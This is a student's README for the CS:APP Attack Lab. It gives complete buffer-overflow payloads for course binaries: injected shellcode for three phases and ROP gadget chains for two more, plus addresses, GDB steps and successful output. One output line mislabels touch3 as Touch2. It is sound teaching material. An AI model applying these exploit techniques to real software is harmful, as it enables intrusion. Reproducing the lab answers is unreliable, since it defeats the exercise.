# 🎯 CSAPP Attack Lab

> **Code injection & return-oriented programming — hijacking `getbuf()` one byte at a time.** 🔫

This is my solution to the **Attack Lab** from
[*Computer Systems: A Programmer's Perspective (3rd Edition)*](https://csapp.cs.cmu.edu/),
as assigned in my university course. The lab is about exploiting a stack buffer
overflow to take control of a program — first by injecting code, then, once the
stack gets boring, by stitching together existing code with ROP. ✨

---

## ⚠️ Disclaimer — read this first

- **Course instance, not the official handout.** The binaries (`ctarget`, `rtarget`)
  and the gadget farm (`farm.c`) were distributed by my course and differ from the
  official files on the CS:APP website.
- **Everything below is instance-specific.** Stack addresses (`0x5564…`), code
  addresses (`0x808…`), and the cookie (`0x4df13892`) only hold for *this* binary.
  On any other instance of the lab, almost every number would be different.
- **For reference only.** 📚 This write-up documents how I solved this particular
  instance. Use it to learn the *techniques* — not as a template to copy.
- **Not reproducible in this repo.** `ctarget`, `rtarget` and `hex2raw` are
  **Linux x86-64 ELF binaries**, while this repository lives on macOS — they need a
  Linux environment (e.g. the Docker container at the repo root) to run. Even then,
  `cookie.txt` is **not included** here (it's a personal, per-instance value), so a
  fresh run would generate a different cookie anyway. 🤷

---

## 📂 What's in this directory?

| File | Purpose |
| --- | --- |
| `ctarget` | 🎯 Code-injection target (Phases 1–3) ❌ **Not included** |
| `rtarget` | 🧩 ROP target (Phases 4–5) ❌ **Not included** |
| `farm.c` | 🌾 Source of `rtarget`'s gadget farm |
| `hex2raw` | 🔧 Converts hex-byte payloads into raw input bytes |
| `ctarget01.txt` | 💉 My Phase 1 payload |
| `ctarget02.txt` | 💉 My Phase 2 payload |
| `ctarget03.txt` | 💉 My Phase 3 payload |
| `rtarget02.txt` | 💉 My Phase 4 (ROP) payload |
| `rtarget03.txt` | 💉 My Phase 5 (ROP) payload |
| `ctarget.d` / `rtarget.d` | 🔍 Full `objdump -d` disassemblies |
| `ctarget02.s` / `ctarget03.s` | 📝 Assembler source of my injected code |
| `cookie.txt` | ❌ **Not included** — personal per-instance value |

---

## 🔗 Official Resources

Get the official lab guide and the self-study handout from the CS:APP site:

- 📘 [Attack Lab writeup](https://csapp.cs.cmu.edu/3e/attacklab.pdf) — the official lab guide
- 📦 [Self-study handout `target1.tar`](https://csapp.cs.cmu.edu/3e/target1.tar)

---

## 🚀 Quick Start

`ctarget` / `rtarget` / `hex2raw` are **Linux x86-64 ELF binaries**, so they need the
Linux container at the repo root:

```bash
# 1. Boot the container (Ubuntu 20.04, linux/amd64)
docker compose -f docker/docker-compose.yml up -d
docker exec -it csapp3e-labs zsh

# 2. Inside the container — repo is mounted at /root/csapp3e-labs
cd AttackLab

# 3. Replay a solution: hex-parse the payload, feed it to the target
cat ctarget03.txt | ./hex2raw | ./ctarget
```

Every payload below is a hex-byte file piped through `./hex2raw`, which strips
comments (`/* */`) and whitespace — so the annotated payloads
(`ctarget01.txt` … `rtarget03.txt`) are directly runnable.

> ⚠️ `cookie.txt` is not in this repo, so a fresh run gets a *different* cookie
> than `0x4df13892` used below.

---

## 🗺️ The Two Fronts

The lab is one vulnerability, two flavours. Both targets read your byte stream into
`getbuf()`'s 56-byte buffer and then `ret` straight into whatever you put after it —
the attack is entirely about what the *stack* looks like at that moment:

| | `ctarget` | `rtarget` |
| --- | --- | --- |
| Stack address | Fixed (no ASLR) | Randomized 🎲 |
| Stack memory | Executable | Non-executable 🚫 |
| Technique | Code injection 💉 | Return-oriented programming 🧱 |
| Phases | 1, 2, 3 | 4, 5 |

| Phase | Target | Goal | Technique |
| --- | --- | --- | --- |
| 1 | `touch1` | redirect the return address | overwrite return address |
| 2 | `touch2` | pass the cookie in `%rdi` | inject code |
| 3 | `touch3` | pass the cookie *string* in `%rdi` | inject code + stash a string |
| 4 | `touch2` | pass the cookie in `%rdi` | ROP gadget chain |
| 5 | `touch3` | pass the cookie *string* in `%rdi` | ROP gadget chain + stash a string |

---

## 🕵️ Recon: key addresses

Disassembling with `objdump -d ctarget` (see `ctarget.d`) gives us everything we need:

```assembly
000000000080891c <getbuf>:
  80891c:  48 83 ec 38      sub    $0x38,%rsp      # 56-byte buffer
  808920:  48 89 e7         mov    %rsp,%rdi       # Gets(buf)
  808923:  e8 94 02 00 00   callq  808bbc <Gets>   # reads our input
  808928:  b8 01 00 00 00   mov    $0x1,%eax
  80892d:  48 83 c4 38      add    $0x38,%rsp
  808931:  c3               retq                   # returns into *our* address
```

| Symbol | Address | Notes |
| --- | --- | --- |
| `getbuf` | `0x80891c` | 56-byte (`0x38`) stack buffer |
| `touch1` | `0x808932` | just needs a visit |
| `touch2` | `0x808960` | `cmp %edi, cookie` — needs cookie in `%rdi` |
| `touch3` | `0x808a77` | calls `hexmatch` — needs cookie *string* in `%rdi` |
| `hexmatch` | `0x8089c4` | allocates ~128 bytes of stack → keep the string far away |
| cookie | `0x4df13892` | this instance's value (from `cookie.txt`) |

For `ctarget`, GDB pinned down the stack layout around `getbuf()`:

- buffer starts at `0x556490b8`
- return-address slot sits at **`0x556490f0`** (56 bytes above the buffer start)
- my injected code lives at **`0x556490e0`** (offset 40 in the buffer)

Both binaries are **non-PIE**, so all code addresses are stable across runs. 🙌

> ⚠️ **Stack addresses are environment-specific — re-derive them with GDB!**
> The `0x5564…` addresses above (buffer / injected code / cookie string) belong
> to the exact binary + container this write-up was verified with. They are
> **not portable**: the actual stack address depends on this instance's
> `buf_offset` (derived from `srandom(target_id+1)` + `scramble()`), which
> differs across environments, builds and containers. **Before replaying
> Phases 2 & 3, re-derive the buffer address in *your* environment:**
>
> ```bash
> # 1. feed any (harmless) input, e.g. Phase 1's raw bytes
> cat ctarget01.txt | ./hex2raw > /tmp/in.bin
>
> # 2. stop at getbuf right after the buffer is allocated (sub $0x38,%rsp)
> gdb -batch \
>   -ex 'b *0x808920' \
>   -ex 'run -q < /tmp/in.bin' \
>   -ex 'p/x $rsp' \
>   ./ctarget
>
> # $rsp is BUF_START → injected code goes at BUF_START + 0x28 (40 bytes in),
> # and the Phase-3 cookie string at BUF_START + 0xbf (191 bytes in).
> ```
> Then write the derived value into `ctarget02.txt` / `ctarget03.txt`
> (little-endian, 8 bytes).

---

## 💉 Part I: Code Injection Attacks (`ctarget`)

### 🥊 Phase 1 — `touch1` (redirect the return address)

**Goal:** make `getbuf()` return into `touch1` (`0x808932`) instead of `test`.

`touch1` doesn't check anything — it just needs to be *called*. The buffer is 56
bytes, so the saved return address sits exactly 56 bytes in. Pad the buffer with
zeros, then write `touch1`'s address in **little-endian** byte order:

```
00 × 56                       ← fill the 56-byte buffer
32 89 80 00 00 00 00 00       ← 0x808932  (touch1)
```

```bash
$ cat ctarget01.txt | ./hex2raw | ./ctarget -q
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
```

Simple. 😌

### 🥊 Phase 2 — `touch2` (inject code that passes the cookie)

**Goal:** return into injected code that loads the cookie into `%rdi` (first argument),
then jumps to `touch2` (`0x808960`). `touch2` prints the cookie and compares it to the
global `cookie`:


`ctarget`'s stack is **fixed and executable**, so we can place real machine code in
the buffer. My payload is 13 bytes:

```assembly
mov    $0x4df13892, %rdi   # 48 c7 c7 92 38 f1 4d   — cookie → first arg
pushq  $0x808960           # 68 60 89 80 00         — touch2
ret                        # c3                     — pop the address & jump
```

The tricky part: the code can't overwrite the return address that leads to it, so I
put the code at **offset 40** in the buffer (address `0x556490e0`) and pointed the
saved return address there:

```
00 × 40                                 ← first 40 bytes of buffer (padding)
48 c7 c7 92 38 f1 4d 68 60 89 80 00 c3  ← injected code @ 0x556490e0
00 00 00                                ← padding to fill the buffer
e0 90 64 55 00 00 00 00                 ← return address → 0x556490e0
```

`mov` sets `%rdi = 0x4df13892`, `push` drops `touch2`'s address onto the stack, and
`ret` jumps straight into it. 🎉

```bash
$ cat ctarget02.txt | ./hex2raw | ./ctarget -q
Touch2!: You called touch2(0x4df13892)
Valid solution for level 2 with target ctarget
```

> 🪤 **Gotcha: the injected code must start at offset 40 (`0x556490e0`) — don't shift it!**
> The 13-byte payload must start at byte offset 40 of the 56-byte buffer. If it
> starts later, it
> **overlaps the return-address slot** at offset 56 → the first payload byte
> clobbers the return address (`e0 90 64 55 …` is never used) and `getbuf`'s
> `ret` jumps into garbage → `Ouch!: You caused a segmentation fault!`.

### 🥊 Phase 3 — `touch3` (inject code that passes the cookie *string*)

**Goal:** pass the cookie to `touch3` (`0x808a77`) as a **string** — `"4df13892"`
(null-terminated) — because `touch3` compares it with `hexmatch()`.

Two things to handle:

1. **The string must survive.** `hexmatch` itself allocates ~128 bytes of stack, so
   the string must live *far above* the buffer — I stashed it at **`0x55649177`**.
2. **`%rdi` must point at it.** Same injection trick as Phase 2:

```assembly
mov    $0x55649177, %rdi    # 48 c7 c7 77 91 64 55   — string address → %rdi
pushq  $0x808a77            # 68 77 8a 80 00          — touch3
ret                        # c3
```

```
00 × 40                                          ← padding
48 c7 c7 77 91 64 55 68 77 8a 80 00 c3          ← injected code @ 0x556490e0
00 00 00                                        ← padding
e0 90 64 55 00 00 00 00                         ← return address → 0x556490e0
00 × 128                                        ← long stretch of zeros
34 64 66 31 33 38 39 32 00                      ← "4df13892\0" @ 0x55649177
```

The `0x34` is ASCII `'4'`, and `64 66 31 33 38 39 32 00` is `"df13892\0"` — together
`"4df13892"`. `%rdi` points there, so `hexmatch` finds the string regardless of where
its own stack frame lands. 🧠

```bash
$ cat ctarget03.txt | ./hex2raw | ./ctarget -q
Touch2!: You called touch3("4df13892")
Valid solution for level 3 with target ctarget
```

---

## 🧱 Part II: Return-Oriented Programming (`rtarget`)

The party ends in Phase 4. `rtarget` fights back with two countermeasures:

1. **Non-executable stack** (`-Wl,-z,noexecstack`) — the CPU refuses to run anything
   that lives on the stack, so my injected `0x48 0xc7 ...` code from Part I is now
   just a bunch of harmless bytes.
2. **Randomized stack address** (ASLR) — even if I could execute code there, I no
   longer know *where* the buffer lives, so I can't hardcode a target address like
   `0x556490e0`.

So we pivot to **return-oriented programming**: instead of injecting *new* code, we
carefully chain together fragments of code that **already exist** in the target.
Each fragment — a few instructions ending in `ret` — is called a **gadget**. Because
each gadget ends in `ret`, it pops the *next* address off the stack, so the whole
attack becomes nothing more than a stack full of addresses:

```
buffer padding → gadget₁ → operand₁ → gadget₂ → operand₂ → touchX → ...
```

The code addresses are all fixed (non-PIE), so we still know exactly where every
gadget lives — only the *data* (our buffer) is at an unknown address. That unknown
address is exactly what separates the two phases:

- **Phase 4** only needs to load a *constant* (the cookie) into `%rdi`. The value
  rides on the ROP stack as a literal operand, so the chain never has to reference
  a stack address at all.
- **Phase 5** must point `%rdi` at the cookie *string*, which lives on the stack at
  a randomized address. The chain therefore *computes* the address at run time: it
  captures `%rsp`, adds a fixed offset, and lands on the string.

To build either chain we need the right building blocks — and `rtarget` gives them
to us as a **gadget farm**.

### 🔎 The gadget farm

The farm is a heap of innocuous-looking functions (`getval_352`, `setval_366`,
`add_xy`, …) in the target's own code (see `farm.c`). Their machine-code bytes
accidentally contain useful instruction sequences if you jump in at the *right
offset*. Phase 4 officially restricts gadgets to `movq`, `popq`, `nop`, and
`ret`; for Phase 5 that is relaxed — the farm even ships a whole `add_xy`
function, plus the 32-bit `movl` moves needed to ferry a constant into `%rsi`.
`farm.c` compiles cleanly (`gcc -Og -o farm farm.c`), so you can `objdump -d` your
own copy and hunt for gadgets the same way I did.

**Hunting technique.** A gadget can hide *inside* another instruction — the bytes
are fixed, but the CPU happily starts decoding at whatever offset you jump to.
Two worked examples:

```
0000000000808b43 <getval_352>:
  808b43:	b8 a2 21 d7 58       	mov    $0x58d721a2,%eax     ← 58 is the 5th byte!
  808b48:	c3                   	retq
```

`getval_352` just loads `0x58d721a2` into `%eax`… but look at the **bytes**:
`b8 a2 21 d7 58 c3`. If we jump to offset **+4** (`0x808b47`), the CPU decodes
`58 c3` — which is `popq %rax; retq`. The `mov` immediate conveniently contains
the `pop` opcode. 🎣

```
0000000000808b21 <setval_366>:
  808b21:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
  808b27:	c3                   	retq
```

Same trick. Jumping to offset **+2** (`0x808b23`) hits `48 89 c7 c3` —
`movq %rax, %rdi; retq`. The immediate `0xc3c78948` is literally the little-endian
bytes of our two instructions. 😄

**The arsenal.** Both phases draw from the same pool. Seven gadgets in total,
numbered below in the order the Phase-5 chain uses them:

| # | Instructions | Address | Bytes (from that address) | Where |
| --- | --- | --- | --- | --- |
| 1 | `popq %rax` | `0x808b47` | `58 c3` | inside `getval_352` — hunt #1 above |
| 2 | `movq %rax, %rdi` | `0x808b23` | `48 89 c7 c3` | inside `setval_366` — hunt #2 above |
| 3 | `movq %rsp, %rax` | `0x808bec` | `48 89 e0 c3` | inside `setval_109`'s immediate |
| 4 | `movl %eax, %edx; cmp %dl,%dl` | `0x808c1a` | `89 c2 38 d2 c3` | inside `getval_128` |
| 5 | `movl %edx, %ecx; cmp %cl,%cl` | `0x808b5c` | `89 d1 38 c9 c3` | inside `getval_213` |
| 6 | `movl %ecx, %esi; cmp %bl,%bl` | `0x808bcf` | `89 ce 38 db c3` | inside `addval_150` |
| 7 | `lea (%rdi,%rsi,1), %rax` | `0x808b56` | `48 8d 04 37 c3` | the whole `add_xy` function |

The `cmp %dl,%dl` / `%cl,%cl` / `%bl,%bl` in gadgets 4–6 only touch the flags, so
they behave like `nop`s. The moves are `movl` (32-bit), which zero the upper half
of their destination register — harmless with such a small offset. 🧘

### 🥊 Phase 4 — `touch2` via ROP (pass the cookie with gadgets)

**Goal:** same as Phase 2 — cookie in `%rdi`, then call `touch2` (`0x808960`) — but
with zero lines of injected code.

Phase 4 only needs a *data value*, and that value rides on the ROP stack as a
literal operand — no stack address has to be computed. Gadgets 1 and 2 are all
it takes:

```
popq  %rax             %rax = 0x4df13892   (popped straight off the ROP stack)
movq  %rax,%rdi        %rdi = cookie → first argument
touch2
```

```
00 × 56                                     ← fill getbuf()'s 56-byte buffer
47 8b 80 00 00 00 00 00                     ← gadget 1: popq %rax          @ 0x808b47
92 38 f1 4d 00 00 00 00                     ← cookie 0x4df13892  →  %rax
23 8b 80 00 00 00 00 00                     ← gadget 2: movq %rax, %rdi    @ 0x808b23
60 89 80 00 00 00 00 00                     ← touch2                       @ 0x808960
```

Read it like a program: `getbuf` returns → `ret` sends us to `0x808b47`
(`pop %rax`) → that `pop` consumes the next stack slot, so `%rax = 0x4df13892`
→ its `ret` sends us to `0x808b23` (`mov %rax, %rdi`) → that `ret` sends us to
`0x808960` (`touch2`). The stack pointer walks forward through the payload, each
`ret` consuming one address — no stack-address knowledge required. 🧩

```bash
$ cat rtarget02.txt | ./hex2raw | ./rtarget -q
Touch2!: You called touch2(0x4df13892)
Valid solution for level 2 with target rtarget
```

### 🥊 Phase 5 — `touch3` via ROP (compute the *string* pointer with gadgets)

**Goal:** same as Phase 3 — point `%rdi` at the string `"4df13892"` so `touch3`
(`0x808a77`) can compare it with `hexmatch` — but now the stack address is
**randomized**, so the string's address can never be hardcoded. 🔮

The only fact we can rely on is the payload's **relative layout** — so instead of
loading a hardcoded address, the chain *computes* one: capture `%rsp` while it is
running, add a fixed offset that lands exactly on the string, and hand the result
to `touch3`. That's what gadget 7 (`add_xy`) is for — the farm's gift. 🎁

**Offset math.** When `getbuf` returns, `%rsp` points at `base + 64` (`base` =
buffer start). Gadget 3 captures exactly that value, so `%rdi = base + 64`. The
cookie string lives at `base + 200`, so the offset to add is `200 - 64 = 136 =
0x88`. That keeps the string 80 bytes clear of `hexmatch`'s ~128-byte stack
frame — far enough that it can never be overwritten. 🧠

**The chain** — gadget 3 grabs `%rsp` into `%rdi`, gadget 1 pops the constant
offset, gadgets 4–6 ferry it into `%rsi`, gadget 7 adds the two, and gadget 2
lands the result in `%rdi`:

```
movq  %rsp,%rax         %rax = base + 64
movq  %rax,%rdi         %rdi = base + 64
popq  %rax              %rax = 0x88               (the offset)
movl  %eax,%edx
movl  %edx,%ecx
movl  %ecx,%esi         %rsi = 0x88
lea   (%rdi,%rsi),%rax  %rax = base + 64 + 136 = base + 200
movq  %rax,%rdi         %rdi → "4df13892" @ base + 200
touch3
```

```
00 × 56                                     ← fill getbuf()'s 56-byte buffer
ec 8b 80 00 00 00 00 00                     ← gadget 3: movq %rsp,%rax       @ 0x808bec
23 8b 80 00 00 00 00 00                     ← gadget 2: movq %rax,%rdi       @ 0x808b23
47 8b 80 00 00 00 00 00                     ← gadget 1: popq %rax            @ 0x808b47
88 00 00 00 00 00 00 00                     ← offset 0x88 → %rax
1a 8c 80 00 00 00 00 00                     ← gadget 4: movl %eax,%edx       @ 0x808c1a
5c 8b 80 00 00 00 00 00                     ← gadget 5: movl %edx,%ecx       @ 0x808b5c
cf 8b 80 00 00 00 00 00                     ← gadget 6: movl %ecx,%esi       @ 0x808bcf
56 8b 80 00 00 00 00 00                     ← gadget 7: lea (%rdi,%rsi),%rax @ 0x808b56
23 8b 80 00 00 00 00 00                     ← gadget 2: movq %rax,%rdi       @ 0x808b23
77 8a 80 00 00 00 00 00                     ← touch3                         @ 0x808a77
00 × 64                                     ← padding to offset 200
34 64 66 31 33 38 39 32 00                  ← "4df13892\0" @ offset 200
```

```bash
$ cat rtarget03.txt | ./hex2raw | ./rtarget -q
Touch3!: You called touch3("4df13892")
Valid solution for level 3 with target rtarget
```

That completes the whole lab: five phases, two targets, one overflowing
`getbuf()`. 🏁


---

## 💡 Takeaways

- **The return address is just data.** `getbuf` writes 56 bytes into a stack buffer
  and blindly `ret`s into whatever 8 bytes sit above it. At its core, every attack
  in this lab is that one fact.
- **Little-endian everywhere.** `0x0808932` goes on the wire as
  `32 89 80 00 00 00 00 00`. Get the byte order wrong and the CPU jumps into the
  void.
- **Defenses shape exploits.** Fixed executable stack → free-form code injection.
  Random non-executable stack → ROP with hardcoded *code* addresses and data
  carried purely on the stack.
- **Gadgets hide in plain sight.** `popq %rax` was sitting inside a `movl`
  immediate; `movq %rax, %rdi` inside another one. The farm is an invitation to
  disassemble from every offset.
- **`hex2raw` is your friend.** Every payload above is a hex-byte file piped
  through `./hex2raw`; the converter strips comments (`/* */`) and whitespace, so
  annotated payloads like `ctarget01.txt`–`rtarget03.txt` are directly runnable.

All code addresses in this write-up come from `ctarget.d` / `rtarget.d`
(`objdump -d`), and every stack address in Part I was pinned down with GDB — the
two tools do 95% of the work. 🔧

---

## ✅ Test Results

| Phase | Payload | Result |
| --- | --- | --- |
| 1 | `ctarget01.txt` | ✅ `Valid solution for level 1 with target ctarget` |
| 2 | `ctarget02.txt` | ✅ `Valid solution for level 2 with target ctarget` |
| 3 | `ctarget03.txt` | ✅ `Valid solution for level 3 with target ctarget` |
| 4 | `rtarget02.txt` | ✅ `Valid solution for level 2 with target rtarget` |
| 5 | `rtarget03.txt` | ✅ `Valid solution for level 3 with target rtarget` |

---

## 🙏 Credits

- Lab by [CS:APP](https://csapp.cs.cmu.edu/) — *Randal E. Bryant & David R. O'Hallaron*
- Course instance & handout by my university
- Cookie `0x4df13892` from a personal `cookie.txt` — not included in this repo 🤷
- Solution explanations written by me, verified against the actual binaries
  (`ctarget`, `rtarget`) and their disassemblies (`ctarget.d`, `rtarget.d`)

**Happy hacking — and may your bytes be ever little-endian. 🫡**

